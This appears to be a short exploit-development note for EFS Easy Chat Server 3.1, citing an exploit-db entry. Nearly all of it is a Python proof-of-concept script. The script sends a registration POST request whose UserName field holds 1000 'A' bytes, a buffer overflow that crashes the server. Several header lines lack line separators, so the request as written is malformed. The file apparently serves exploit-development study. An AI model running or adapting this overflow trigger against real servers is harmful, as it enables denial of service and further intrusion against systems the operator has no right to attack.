# EFS Easy Chat Server 3.1

Downloaded from: https://www.exploit-db.com/exploits/42155

## Initial Crash

```py
#!/usr/bin/python

import os
import sys
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80
target = (TARGET_IP, TARGET_PORT) 

payload = b"A" * 1000

buffer = b"POST /registresult.htm HTTP/1.1\r\n\r\n"
buffer += b"Host: 192.168.1.11"
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
buffer += b"Accept-Language: en-US,en;q=0.5"
buffer += b"Accept-Encoding: gzip, deflate"
buffer += b"Referer: http://192.168.1.11/register.ghp"
buffer += b"Connection: close"
buffer += b"Content-Type: application/x-www-form-urlencoded"

buffer += b"UserName=" + payload + b"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register" 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect(target) 
s.send(buffer) 
s.close() 
```
